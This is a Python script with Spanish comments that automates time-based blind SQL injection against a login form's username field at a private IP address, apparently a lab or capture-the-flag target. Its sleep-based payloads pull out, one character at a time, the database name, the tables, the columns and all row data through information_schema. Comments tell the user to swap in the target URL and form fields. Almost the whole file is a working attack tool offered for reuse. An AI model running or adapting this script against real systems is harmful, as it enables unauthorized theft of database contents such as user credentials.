#!/usr/bin/python3

import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
	log.failure("Saliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

#Cambiar por la URL en la que inyectar SQL
url = 'http://10.129.161.172/'
scompleto = 101, 97, 111, 105, 117, 116, 110, 104, 115, 114, 108, 100, 99, 109, 119, 121, 102, 112, 103, 98, 118, 107, 106, 120, 113, 122, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 69, 65, 79, 73, 85, 84, 78, 72, 83, 82, 76, 68, 67, 77, 87, 89, 70, 80, 71, 66, 86, 75, 74, 88, 81, 90, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 64, 91, 92, 93, 94, 95, 96, 123, 124, 125, 126
sbasico = 101, 97, 111, 105, 117, 116, 110, 104, 115, 114, 108, 100, 99, 109, 119, 121, 102, 112, 103, 98, 118, 107, 106, 120, 113, 122, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57
#Cambiar s por el basico o completo
s = scompleto
#Tiempo de espera para resultado correcto (ponlo dependiendo de la velocidad de respuesta del servidor)
t = 2

#No tocar, son variables declaradas
database = ''
tabla = ''
columna = ''
resultado = ''
lista_tablas = []
lista_columnas = []
lista_resultados = []
lista_columnas_tablas = []

#Función que retorna un 1 si el tiempo de espera es mayor que t
def check(payload):

	#Cambiar por el post de inicio de sesión
	data_post = {
		'username': '%s' % payload,
		'password': 'test'
	}

	time_start = time.time()
	content = requests.post(url, data=data_post)
	time_end = time.time()

	if time_end - time_start > t:
		return 1

#Llamamos a las dos barras de progreso de pwn
p2 = log.progress("Payload")
p1 = log.progress("Datos")

#Sacamos el nombre de la base de datos
for i in range(1, 50):
	for c in s:
		payload = "' or if(ascii(substr(database(),%d,1))='%d',sleep(%d),1)-- -" % (i, c, t)

		p2.status("%s" % payload)

		if check(payload):
			database += chr(c)
			p1.status("%s" % database)
			break

	if len(database) != i:
		break

log.info("Database: %s" % database)

#Comenzamos a sacar las tablas
for j in range(0, 50):
	for i in range(1, 50):
		for c in s:
			payload= "' or if(ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1))='%d',sleep(%d),1)-- -" % (database, j, i, c, t)

			p2.status("%s" % payload)

			if check(payload):
	                        tabla += chr(c)
        	                p1.status("%s" % tabla)
                	        break

		if len(tabla) != i:
			if len(tabla) != 0:
				lista_tablas.append(tabla)
				log.info("Tabla [%d]: %s" % (j, tabla))
				tabla = ''
			break

	jmod = j + 1

	if len(lista_tablas) != jmod:
		break

#Sacamos las columnas de las tablas
for a in lista_tablas:

	for j in range(0, 50):
		for i in range(1, 50):
			for c in s:
				payload = "' or if(ascii(substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1),%d,1))='%d',sleep(%d),1)-- -" % (database, a, j, i, c, t)

				p2.status("%s" % payload)

				if check(payload):
					columna += chr(c)
					p1.status("%s" % columna)
					break

			if len(columna) != i:
				if len(columna) != 0:
					log.info("Columna [%d] en %s: %s" % (j, a, columna))
					lista_columnas.append(columna)
					columna = ''
				break

		jmod = j + 1

		if len(lista_columnas) != jmod:
			lista_columnas_tablas.append(lista_columnas)
			lista_columnas.clear()
			break

#Sacamos los datos de las columnas
for b in range(0, len(lista_columnas_tablas)):
	print(lista_columnas_tablas[b])
	for a in lista_columnas_tablas[b]:

		for j in range(0, 100):
			for i in range(1, 100):

				for c in s:
					payload = "' or if(ascii(substr((select %s from %s limit %d,1),%d,1))='%d',sleep(%d),1)-- -" % (a, lista_tablas[b], j, i, c, t)

					p2.status("%s" % payload)

					if check(payload):
						resultado += chr(c)
						p1.status("%s" % resultado)
						break

				if len(resultado) != i:
					if len(resultado) != 0:
						log.info("%s [%s] de %s: %s" % (a, j, lista_tablas[b], resultado))
						lista_resultados.append(resultado)
						resultado = ''
					break

			jmod = j + 1

			if len(lista_resultados) != jmod:
				lista_resultados = []
				break
